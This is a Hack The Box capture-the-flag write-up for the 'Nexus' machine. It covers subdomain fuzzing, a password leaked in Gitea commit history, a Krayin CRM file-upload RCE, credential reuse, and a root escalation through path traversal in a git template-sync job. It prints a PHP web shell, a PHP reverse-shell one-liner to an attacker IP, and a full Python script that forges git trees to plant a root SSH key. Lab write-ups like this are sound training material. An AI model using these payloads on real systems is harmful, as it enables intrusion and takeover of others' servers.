# HTB Write-Up: Nexus

| Field      | Details      |
| ---------- | ------------ |
| Platform   | Hack The Box |
| Difficulty | Medium       |
| OS         | Linux        |
| Author     | shreekara    |
| Date       | July 15, 2026 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — subdomains](#2-enumeration--subdomains)
3. [Gitea repo → leaked DB password](#3-gitea-repo--leaked-db-password)
4. [Krayin CRM RCE (CVE-2026-38526)](#4-krayin-crm-rce-cve-2026-38526)
5. [Shell as www-data → jones](#5-shell-as-www-data--jones)
6. [Root via Gitea template-sync](#6-root-via-gitea-template-sync)
7. [Summary](#7-summary)

---

## 1. Reconnaissance

Standard start:

```
sudo nmap -sS -sV -T4 10.129.6.203
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

<img width="975" height="376" alt="Screenshot 2026-07-16 024847" src="https://github.com/user-attachments/assets/27884e00-58a1-4b26-854b-c91dd45a6727" />


Just SSH and a web server, so added the vhost and moved to the site.

```
sudo pluma /etc/hosts
```

```
10.129.6.203 nexus.htb
```

---

## 2. Enumeration — subdomains

`http://nexus.htb/` is a government-looking energy authority site. Nothing broken on the homepage itself, but the Careers page has a job listing that leaks two internal emails in the "how to apply" box:

- `careers@nexus.htb`
- `j.matthew@nexus.htb` (the actual hiring manager)

<img width="1918" height="1009" alt="Screenshot 2026-07-16 024919" src="https://github.com/user-attachments/assets/f5f5c970-b929-439f-8780-c0cf6bf1d08c" />
<img width="1915" height="1006" alt="Screenshot 2026-07-16 024937" src="https://github.com/user-attachments/assets/da972dae-f34b-44eb-88fd-d86c2d6a4060" />


Kept `j.matthew@nexus.htb` in mind, it's the kind of thing that ends up being a login username later.

Ran ffuf for subdomains against the Host header:

```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb"
```

<img width="1357" height="823" alt="Screenshot 2026-07-16 025014" src="https://github.com/user-attachments/assets/607cc496-c900-4aae-b055-ab2d6d2f34a9" />

Wildcard DNS, so basically everything comes back 302/154 bytes/4 words. Filtered that out:

```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fw 4
```

```
git      [Status: 200, Size: 14472]
billing  [Status: 302, Size: 390]
```

<img width="1401" height="656" alt="Screenshot 2026-07-16 025030" src="https://github.com/user-attachments/assets/c14481fa-8a40-46ee-aebe-7174e6d7a305" />

Two real subdomains. Added them:

```
echo "10.129.6.203 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

<img width="935" height="74" alt="Screenshot 2026-07-16 025041" src="https://github.com/user-attachments/assets/792718f8-0b3b-4e74-9e4f-43b4e29663f1" />


---

## 3. Gitea repo → leaked DB password

`git.nexus.htb` is a Gitea instance, browsable without logging in.

<img width="1918" height="1004" alt="Screenshot 2026-07-16 025055" src="https://github.com/user-attachments/assets/7fda3c43-9be1-4a9a-a966-4c0d378575c9" />

Explore → Repositories shows one repo: `admin/krayin-docker-setup`, 2 commits, 1 branch.

<img width="1911" height="379" alt="Screenshot 2026-07-16 025340" src="https://github.com/user-attachments/assets/fe902643-9ccf-4e9f-ac4a-900b52be7e69" />

Contains `.env`, `docker-compose.yml`, and a `documents` folder.

<img width="1372" height="414" alt="Screenshot 2026-07-16 025349" src="https://github.com/user-attachments/assets/63f022be-6697-43e1-9587-f6ded6a12ccb" />

The current `.env` didn't have much in it, but checked the commit history on the file anyway — someone had changed the DB password at some point, but never bothered to purge the old commit. Old commit still has the plaintext password sitting there.

That, plus `j.matthew@nexus.htb` from the careers page, was enough to go try `billing.nexus.htb`.

---

## 4. Krayin CRM RCE (CVE-2026-38526)

`billing.nexus.htb` redirects to `/admin/login` — Krayin CRM, an open source Laravel CRM.

Logged in with `j.matthew@nexus.htb` + the leaked DB password. Worked first try, password reuse between the DB and the admin account.

Panel shows version **v2.2.0**. Quick search turns up:

| CVE            | Type                            | CVSS | Impact              |
| -------------- | -------------------------------- | ---- | -------------------- |
| CVE-2026-38526 | Unrestricted file upload → RCE  | 9.9  | Full server takeover |

The bug is in the TinyMCE image upload handler — no extension/content checks, so a `.php` file gets saved and served over HTTP just fine.

Used the image upload button inside Compose Email to trigger it:

1. Uploaded any image through the editor.
2. Caught the request in Burp, sent to Repeater.
3. Changed the filename to `RCE.php`, swapped the image bytes for:

```php
<?php echo shell_exec($_GET["c"]); ?>
```

4. Forwarded it, got `200 OK` and the path back.

Hit the path with `?c=id`, command execution confirmed.

Reverse shell one-liner (URL-encoded, sent through the same `?c=` param):

```
php -r '$sock=fsockopen("10.10.16.194",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Listener:

```
nc -lnvp 4444
```

Shell landed:

```
Connection received on 10.129.6.203 57088
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="1309" height="256" alt="Screenshot 2026-07-16 035125" src="https://github.com/user-attachments/assets/851cf984-7c26-456c-b2ad-ef6ba390c94f" />

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. Shell as www-data → jones

```
cd krayin
ls -la
```

Normal Laravel/Krayin layout.

<img width="780" height="764" alt="Screenshot 2026-07-16 035416" src="https://github.com/user-attachments/assets/daa16a86-d356-4467-834f-d82fda2ae797" />


```
cat /etc/passwd
```

`jones` is the only real user with a shell.

<img width="864" height="834" alt="Screenshot 2026-07-16 040128" src="https://github.com/user-attachments/assets/edb8377b-5bea-4bf4-a2b7-29a99eed9f5b" />


```
cat .env
```

```
DB_PASSWORD=y27xb3ha!!74GbR
```

<img width="654" height="562" alt="Screenshot 2026-07-16 040155" src="https://github.com/user-attachments/assets/8f55bdfc-b80c-443e-9d66-046c61740c53" />

Same password, still current. Tried it against SSH for `jones` since he's the only real user on the box.

```
ssh jones@10.129.6.203
# y27xb3ha!!74GbR
```

Logged straight in.

```
jones@nexus:~$ cat user.txt
```

<img width="316" height="126" alt="Screenshot 2026-07-16 040325" src="https://github.com/user-attachments/assets/23911612-31e9-4773-9017-35866c2503c3" />

---

## 6. Root via Gitea template-sync

There's a cron/timer on the box, `gitea-template-sync.timer`, running `/etc/gitea/template-sync.py` as root. It syncs files out of any Gitea repo marked as a "Template", using `git ls-tree` output to figure out where to write files. It joins those paths with `os.path.join()` without checking for `../`, so a crafted tree entry can escape the sync destination entirely.

`jones`'s creds work on Gitea too, so:

```
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Made a new repo called `RCE`, marked it as a Template, cloned it:

```
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/RCE.git
cd RCE
touch README.md
```

Git itself won't let you commit a path with `../` in it through the normal commands, so I wrote a small script to build the git objects by hand (blob/tree/commit, dropped straight into `.git/objects`) with a tree entry that walks up four directories and back down into `root/.ssh/`, dropping the ed25519 pubkey as `authorized_keys`:

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo"); sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''"); sys.exit(1)
key = r.stdout.strip() + "\n"

blob   = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t  = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur    = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir    = write_obj(entry("40000", "root", cur), "tree")
for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")
root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")
os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

```
python3 /tmp/build.py
git push -u origin main --force
```

Timer fires about once a minute, waited it out and checked the log:

```
cat /var/log/template-sync.log
```

Key got written to `/root/.ssh/authorized_keys`. Root:

```
ssh -i /tmp/.k root@nexus.htb
```

```
root@nexus:~# cat root.txt
```

<img width="878" height="615" alt="Screenshot 2026-07-16 042208" src="https://github.com/user-attachments/assets/a7655be2-177d-4da6-a596-6ba1597d9355" />


---

## 7. Summary

| Step             | What happened                                                    |
| ----------------- | ----------------------------------------------------------------- |
| Recon             | nmap → 22, 80                                                    |
| Web recon         | Careers page leaks internal emails                                |
| Subdomains        | ffuf + Host header → git., billing.                              |
| Leaked cred       | Old commit on Gitea repo still has the DB password                |
| Initial access    | Krayin admin login (reused DB pw) → CVE-2026-38526 upload RCE     |
| www-data to jones | .env DB password reused as jones's SSH password                   |
| jones to root     | template-sync.py path traversal via hand-built git tree           |

Few things worth remembering from this one:

- Rotating a leaked secret doesn't help if the old commit is still sitting in history. Should've purged it, not just committed a new value on top.
- Same password everywhere (DB, admin panel, SSH) meant one leak was three logins.
- Any "attach an image" widget backed by a shared upload handler is a potential RCE if the server isn't actually checking what got uploaded.
- Root cron jobs that trust paths coming out of user-controlled git repos are a bad idea — git's CLI stops you from committing ../ paths, but nothing stops someone from writing the raw objects by hand.
